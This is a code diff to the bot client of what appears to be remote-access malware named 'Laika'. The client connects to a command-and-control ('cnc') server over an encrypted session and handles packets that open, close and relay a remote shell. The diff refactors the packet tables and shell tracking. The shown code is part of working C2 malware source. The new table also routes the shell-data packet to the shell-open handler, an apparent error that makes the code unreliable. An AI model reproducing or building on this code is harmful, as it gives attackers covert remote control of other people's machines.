@@ -4,12 +4,6 @@
 #include "bot.h"
 #include "shell.h"
 
-LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t),
-    [LAIKAPKT_SHELL_OPEN] = sizeof(uint8_t),
-    [LAIKAPKT_SHELL_CLOSE] = sizeof(uint8_t),
-};
-
 void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
     uint8_t endianness = laikaS_readByte(&peer->sock);
@@ -18,11 +12,23 @@ void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, 
     LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"));
 }
 
-PeerPktHandler laikaB_handlerTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = laikaB_handleHandshakeResponse,
-    [LAIKAPKT_SHELL_OPEN] = laikaB_handleShellOpen,
-    [LAIKAPKT_SHELL_CLOSE] = laikaB_handleShellClose,
-    [LAIKAPKT_SHELL_DATA] = laikaB_handleShellData,
+struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
+        laikaB_handleHandshakeResponse,
+        sizeof(uint8_t),
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_OPEN,
+        laikaB_handleShellOpen,
+        0,
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
+        laikaB_handleShellClose,
+        0,
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
+        laikaB_handleShellOpen,
+        0,
+    true),
 };
 
 struct sLaika_bot *laikaB_newBot(void) {
@@ -31,12 +37,11 @@ struct sLaika_bot *laikaB_newBot(void) {
     char *tempIPBuf;
     size_t _unused;
 
-    memset(bot->shells, 0, sizeof(bot->shells));
+    bot->shell = NULL;
 
     laikaP_initPList(&bot->pList);
     bot->peer = laikaS_newPeer(
-        laikaB_handlerTbl,
-        laikaB_pktSizeTbl,
+        laikaB_pktTbl,
         &bot->pList,
         (void*)bot
     );
@@ -85,11 +90,9 @@ void laikaB_freeBot(struct sLaika_bot *bot) {
     laikaP_cleanPList(&bot->pList);
     laikaS_freePeer(bot->peer);
 
-    /* clear shells */
-    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
-        if (bot->shells[i])
-            laikaB_freeShell(bot, bot->shells[i]);
-    }
+    /* clear shell */
+    if (bot->shell)
+        laikaB_freeShell(bot, bot->shell);
 
     laikaM_free(bot);
 }
@@ -115,10 +118,10 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */
 
     if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
-        LAIKA_ERROR("failed to gen session key!\n")
+        LAIKA_ERROR("failed to gen session key!\n");
 
     if (!laikaS_handlePeerOut(bot->peer))
-        LAIKA_ERROR("failed to send handshake request!\n")
+        LAIKA_ERROR("failed to send handshake request!\n");
 }
 
 void laikaB_flushQueue(struct sLaika_bot *bot) {
